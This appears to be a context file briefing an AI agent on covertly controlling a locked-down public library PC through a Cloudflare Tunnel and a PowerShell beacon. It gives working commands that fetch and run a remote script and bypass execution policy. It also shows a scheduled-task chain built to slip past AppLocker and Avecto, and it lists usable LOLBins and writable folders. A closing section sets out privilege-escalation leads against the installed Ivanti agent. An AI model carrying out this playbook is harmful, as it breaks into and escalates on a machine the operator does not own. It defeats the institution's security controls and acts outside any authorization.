# Agent Mothership — Context

## Mission
Remote control a locked-down library PC (ABPCP536, Windows 10, user LC2022) via Cloudflare Tunnel + WebSocket beacon relay.

## Architecture
```
AI Agent → curl → Tunnel → Express (port 3000) → WebSocket → Beacon (PowerShell on PC)
```

## Standard Operating Procedure: Connect Beacon

**⚠️ CRITICAL: The one-liner must be served through the URL — user cannot copy-paste from this chat to the library PC.**

In the library PC's Chrome browser, navigate to:
```
https://TUNNEL/oneliner
```
(or `/beacon-run` for the HTML page). Copy the `iex (iwr ...).Content` line from there and paste into VS Code PowerShell terminal.

### Alternative: Download + SCHTASKS (Native PS Window)**ALWAYS use this exact technique — it's the only reliable way to get a native Windows PowerShell window with full TUI support.**

### Step 1: Download beacon script via .Content + Set-Content
```powershell
$script = (iwr -Uri https://TUNNEL/beacon-script -UseBasicParsing).Content
Set-Content C:\Windows\Tasks\beacon.ps1 $script -Encoding UTF8
```
Do NOT use `Invoke-WebRequest -OutFile` — it truncates content. Use `.Content` + `Set-Content`.

### Step 2: Create launcher batch file
```powershell
Set-Content C:\Windows\Tasks\beacon-launch.bat -Value @"
@echo off
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -ExecutionPolicy Bypass -File C:\Windows\Tasks\beacon.ps1
"@ -Encoding ASCII
```
Use full path to powershell.exe and `-File` flag (not `-Command`).

### Step 3: Create and run SCHTASKS task
```powershell
schtasks /create /tn "BeaconLaunch" /tr "cmd.exe /c C:\Windows\Tasks\beacon-launch.bat" /sc ONCE /st 23:59 /f
schtasks /run /tn "BeaconLaunch"
schtasks /delete /tn "BeaconLaunch" /f
```
Chain: `schtasks.exe` → `cmd.exe` → `beacon-launch.bat` → `powershell.exe`
All binaries in `C:\Windows\System32\` (AppLocker trusted by `%WINDIR%\*` rule).

## Keepalive Fix (Applied June 16)
- Beacon sends `{type:"ack"}` immediately before executing any command
- Server uses JSON ping/pong every 30s (not WS ping frames — Cloudflare ignores those)
- Command timeout: 5 min base, extends to 10 min on ack

## PC Profile
| Property | Value |
|----------|-------|
| Hostname | ABPCP532 / LC2022 |
| OS | Windows 10 22H2 build 19045.5131, PS 5.1 |
| User | LC2022 (NOT admin) |
| AppLocker | Active — blocks user profile, certutil, regsvr32 |
| Avecto | Active — hooks SCM, token creation, schtasks |
| Writable dirs | C:\Windows\Tasks\, C:\ProgramData\, C:\Windows\IME, Startup folder |
| Python | 3.10.2 at C:\Program Files\Python310\ (no _pth file) |
| UAC | Enabled (ConsentPromptBehaviorAdmin=5) |
| PC resets | Nightly at 1:00 AM (C:\ wiped, LANDESK dir survives) |

## Available Tools on PC
- Python 3.10.2, BusyBox (at C:\Windows\Tasks\)
- LOLBins: MSBuild.exe, cscript.exe, bitsadmin.exe all work
- No git/node/curl/wget

## Target Software
- Ivanti Security Controls Agent v9.4.34497.0
- STDispatch.exe: SYSTEM RPC dispatcher, PID 4188, 6 ncalrpc endpoints
- STAgentCtl.exe: CLI tool with dispatch/register commands (admin-gated)
- store.dat: 0 bytes (agent unregistered)
- All 6 RPC endpoints bind without ACCESS_DENIED from low-privilege

## Privilege Escalation Leads (Priority Order)
- Patch STAgentCtl.exe admin check → use dispatch cmd as SYSTEM
- Direct RPC call via NdrClientCall3 with extracted MIDL format strings
- Print Spooler junction follow (untested, Dec 2024 patches likely mitigate)
- Python ghost folders via HKCU PythonPath (armed, no SYSTEM trigger found)
- 1AM reset window for timed attacks

## Tunnel
Started with: `cloudflared tunnel --url http://localhost:3000`
Server: `node web-terminal/server.js` on port 3000
